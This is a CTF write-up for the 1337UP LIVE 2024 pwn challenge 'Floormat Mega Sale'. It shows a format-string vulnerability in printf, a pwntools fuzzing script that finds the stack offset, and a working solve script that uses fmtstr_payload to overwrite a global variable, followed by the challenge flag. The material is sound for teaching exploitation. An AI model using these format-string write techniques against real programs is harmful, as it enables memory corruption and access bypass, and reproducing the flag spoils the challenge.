---
name: Floormat Mega Sale (2024)
event: Intigriti 1337UP LIVE CTF 2024
category: Pwn
description: Writeup for Floormat Mega Sale (Pwn) - 1337UP LIVE CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Floormat Mega Sale

## Challenge Description

> The Floor Mat Store is running a mega sale, check it out!

If you played last 1337UPLIVE last year, you might remember the [floormat store](https://crypto-cat.gitbook.io/ctf-writeups/2023/intigriti/pwn/floormat_store). Players were required to exploit a format string vulnerability in `printf()` to leak the flag off the stack. This year, the floormat store is having a MEGA SALE!

## Solution

First, check the binary protections.

{% code overflow="wrap" %}
```bash
checksec --file floormat_sale
[*] '/home/crystal/Desktop/challs/pwn/FloormatSale/solution/floormat_sale'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
{% endcode %}

You might think buffer overflow because there's no stack canaries, but that is not the case.

Let's see what the functionality looks like this time.

{% code overflow="wrap" %}
```bash
nc localhost 1339
Welcome to the Floor Mat Mega Sale!

Please choose from our currently available floor mats:

Please select a floor mat:

1. Cozy Carpet Mat - $10
2. Wooden Plank Mat - $15
3. Fuzzy Shag Mat - $20
4. Rubberized Mat - $12
5. Luxury Velvet Mat - $25
6. Exclusive Employee-only Mat - $9999

Enter your choice:
6

Please enter your shipping address:
cryptocat!

Your floor mat will be shipped to:

cryptocat!

Access Denied: You are not an employee!
```
{% endcode %}

Alright, like last time then, let's try and provide a [format specifier](https://www.geeksforgeeks.org/format-specifiers-in-c) to see if we can [leak values](https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities) from the stack.

{% code overflow="wrap" %}
```bash
Please enter your shipping address:
%p %p %p %p %p %p %p

Your floor mat will be shipped to:

0x1 0x1 0x7f4f6f314887 0x24 (nil) 0x7ffcb5991f68 0x100000000

Access Denied: You are not an employee
```
{% endcode %}

Bingo! We could try leaking values from the stack and converting from hex, or using the `%s` specifier but the flag isn't there this time (wouldn't be a new challenge then, would it?).

You'll want to disassemble the code to see what's going on. I cba rn so here's the original source.

{% code overflow="wrap" %}
```c
int employee = 0;

void employee_access() {
    if (employee != 0) {
        char flag[64];
        FILE *f = fopen("flag.txt", "r");
        if (f == NULL) {
            printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
            exit(0);
        }
        fgets(flag, sizeof(flag), f);
        printf("Exclusive Employee-only Mat will be delivered to: %s\n", flag);
        fclose(f);
    } else {
        printf("\nAccess Denied: You are not an employee!\n");
    }
}
```
{% endcode %}

The function is called when we use the menu option `6`. There's nothing in the code that will ever change the `employee` variable, hopefully this is a hint you need to overwrite that variable.

I've covered format string write attacks on my [youtube](https://www.youtube.com/watch?v=iwNYoDw1hW4) a few times so I'll not do repeat myself in detail here. We already know the location of the variable we want to overwrite (PIE is disabled, we can get it from assembly or reference directly in `pwntools`) and what we want to overwrite it with (anything but `0`). The only thing we need to know is the offset of where our input will land, and we can find that with a fuzzing script.

### fuzz.py

{% code overflow="wrap" %}
```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *employee_access
continue
'''

# Set up pwntools for the correct architecture
exe = './floormat_sale'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

leak_count = 29

# Start program
io = start()

# Choose the Employee-only mat (option 6) to trigger the correct flow
io.sendlineafter(b'Enter your choice:', b'6')

# Wait for the prompt to enter the shipping address
io.recvuntil(b'Please enter your shipping address:')

# Generate a payload that will leak multiple stack values at once (up to 30)
payload = b" ".join([f"AAAA %{i}$p".encode()
                    for i in range(1, leak_count)])
io.sendline(payload)

# Receive the text, so that we don't mess up position of leaked values
io.recvlines(2)

# Receive and print the response to analyze the leaked values
# Decode with 'replace' to avoid crashing on non-ASCII bytes
response = io.recvall().decode(errors="replace")

# Split the response to process each value separately
leaked_values = response.split()

# Print each value with its index for easier analysis
for i in range(leak_count):
    print(f"Leaked value at %<{i}$p>: {leaked_values[i]}")

# Close the process after testing
io.close()
```
{% endcode %}

We run that and see our `AAAA` lands at various offsets, e.g. `8`, `10`, `12` etc.

{% code overflow="wrap" %}
```bash
python fuzz.py REMOTE 127.0.0.1 1339
[+] Opening connection to 127.0.0.1 on port 1339: Done
[+] Receiving all data: Done (565B)
[*] Closed connection to 127.0.0.1 port 1339
Leaked value at %<0$p>: Your
Leaked value at %<1$p>: floor
Leaked value at %<2$p>: mat
Leaked value at %<3$p>: will
Leaked value at %<4$p>: be
Leaked value at %<5$p>: shipped
Leaked value at %<6$p>: to:
Leaked value at %<7$p>: AAAA
Leaked value at %<8$p>: 0x1
Leaked value at %<9$p>: AAAA
Leaked value at %<10$p>: 0x1
Leaked value at %<11$p>: AAAA
Leaked value at %<12$p>: 0x7f18eef14887
Leaked value at %<13$p>: AAAA
Leaked value at %<14$p>: 0x24
Leaked value at %<15$p>: AAAA
Leaked value at %<16$p>: (nil)
Leaked value at %<17$p>: AAAA
Leaked value at %<18$p>: 0x7ffc002c8238
Leaked value at %<19$p>: AAAA
Leaked value at %<20$p>: 0x100000000
Leaked value at %<21$p>: AAAA
Leaked value at %<22$p>: (nil)
Leaked value at %<23$p>: AAAA
Leaked value at %<24$p>: 0x600000000
Leaked value at %<25$p>: AAAA
Leaked value at %<26$p>: 0x2431252041414141
Leaked value at %<27$p>: AAAA
Leaked value at %<28$p>: 0x2520414141412070
```
{% endcode %}

Not all of these offsets will work. I tried `8` and it didn't work but `10` did. You should be able to automate this stage as well but I couldn't get it working (I don't do pwn challenges anymore xD).

So here's a `pwntools` script to solve the challenge for us! It will overwrite the `employee` variable with a `1`.

### solve.py

{% code overflow="wrap" %}
```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDB script below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # Remote execution
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Local execution
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b *employee_access
continue
'''

# Set up pwntools for the correct architecture
exe = './floormat_sale'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# Address of the 'employee' variable
employee_addr = elf.symbols['employee']
info(f"Employee variable address: {hex(employee_addr)}")

# Manually set the format string offset
offset = 10
info(f"Using format string offset: {offset}")

# Craft the payload to overwrite 'employee' variable
# We include the address of 'employee' in the payload
# Then use %<offset>$n to write to that address

# Since the address needs to be on the stack, we place it appropriately
payload = fmtstr_payload(offset, {employee_addr: 1}, write_size='int')

# Start the program
io = start(level='warn')

# Send the choice (option 6)
io.sendlineafter(b'Enter your choice:', b'6')

# Wait for the shipping address prompt
io.recvuntil(b'Please enter your shipping address:')

# Send the payload
io.sendline(payload)

# Receive the output to synchronize
io.recvuntil(b'Your floor mat will be shipped to:')

# Receive and print the flag
io.recvuntil(b'Exclusive Employee-only Mat will be delivered to: ')
flag = io.recvline()
success(f'Flag: {flag.decode()}')
```
{% endcode %}

When we enter menu option `6`, we'll get the flag.

{% code overflow="wrap" %}
```bash
python solve.py REMOTE 127.0.0.1 1339
[*] Employee variable address: 0x40408c
[*] Using format string offset: 10
[+] Flag: INTIGRITI{fake_flag}
```
{% endcode %}

Flag: `INTIGRITI{3v3ry_fl00rm47_mu57_60!!}`
